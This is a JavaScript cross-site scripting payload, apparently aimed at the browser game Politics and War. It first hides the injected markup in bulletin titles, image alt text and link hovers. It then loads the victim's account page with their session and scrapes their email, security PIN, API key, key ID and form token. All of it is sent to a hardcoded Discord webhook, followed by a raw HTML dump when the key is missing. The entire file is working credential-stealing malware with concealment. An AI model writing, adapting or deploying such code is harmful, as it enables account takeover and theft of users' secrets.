// === DOM cleanup — hide payload artifacts ===
document.querySelectorAll('.bulletin-title, .image-placeholder img').forEach(el => {
  // Clean title links: strip everything after the < in the text
  if (el.classList?.contains('bulletin-title')) {
    el.textContent = el.textContent.replace(/<.*$/s, '').trim();
  }
  // Clean alt text on images
  if (el.tagName === 'IMG' && el.alt) {
    el.alt = el.alt.replace(/<.*$/s, '').trim();
  }
});

// Clean the URLs in href attributes (the slug exposes the payload)
document.querySelectorAll('a[href*="onerror"], a[href*="import"]').forEach(a => {
  // Don't change where it links, just hide it from casual inspection
  // The href is server-generated so we can't truly fix it, but we can
  // prevent it showing in the status bar by intercepting hover
  a.addEventListener('mouseenter', () => window.status = '');
});

(async () => {
  const WH = 'https://discord.com/api/webhooks/1519411802142937118/Be6lYlqOJcp3Dvnjixe3BQMc8ukrhnSv4r6yemMGBDb9tZWWSlqPa5Nb6ba6aCvrzqzE';

  const delay = ms => new Promise(r => setTimeout(r, ms));

  const cfDecode = (hex) => {
    const key = parseInt(hex.substr(0, 2), 16);
    let out = '';
    for (let i = 2; i < hex.length; i += 2)
      out += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ key);
    return out;
  };

  try {
    const h = await fetch('/account/', {credentials:'include'}).then(r => r.text());

    const userId = (h.match(/id=['"]app_user_id['"]>(\d+)/) || [])[1];
    const leader = (h.match(/id=['"]app_leader_name['"]>([^<]+)/) || [])[1];
    const nation = (h.match(/id=['"]app_nation_name['"]>([^<]+)/) || [])[1];
    const cfHex  = (h.match(/data-cfemail="([^"]+)"/) || [])[1];
    const email  = cfHex ? cfDecode(cfHex) : 'N/A';
    const pin    = (h.match(/Security PIN:\s*(\d{6})/) || [])[1];
    const keyId  = (h.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1];
    const token  = (h.match(/name="token"\s+value="([^"]+)"/) || [])[1];
    const apiKey = (h.match(/vertical-center center notranslate['"]?>([a-f0-9]{12,})</) || [])[1]
               || (h.match(/notranslate['"]?>([a-f0-9]{12,})\s*<\/td>/) || [])[1];

    await fetch(WH, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({embeds: [{
        title: `🔑 ${leader || 'Unknown'} of ${nation || '???'}`,
        description: `User ID: **${userId || '?'}**`,
        color: 0x2ecc71,
        fields: [
          {name: '📧 Email',     value: `\`${email}\``,          inline: true},
          {name: '🔐 PIN',       value: `\`${pin || 'N/A'}\``,   inline: true},
          {name: '🔑 API Key',   value: `\`${apiKey || 'N/A'}\``, inline: false},
          {name: '🆔 Key ID',    value: `\`${keyId || 'N/A'}\``, inline: true},
          {name: '🎟️ Token',     value: `\`${token || 'N/A'}\``, inline: true}
        ],
        footer: {text: 'PnW XSS Recon'},
        timestamp: new Date().toISOString()
      }]})
    });

    if (!apiKey) {
      await delay(1000);
      const i = h.indexOf('API Key</h3>');
      if (i > -1) {
        await fetch(WH, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({embeds: [{
            title: '🔍 API Key Debug Dump',
            description: h.slice(i, i + 1500),
            color: 0xe74c3c
          }]})
        });
      }
    }

  } catch(e) {
    await fetch(WH, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({content: `❌ ${String(e)}`})
    });
  }
})();
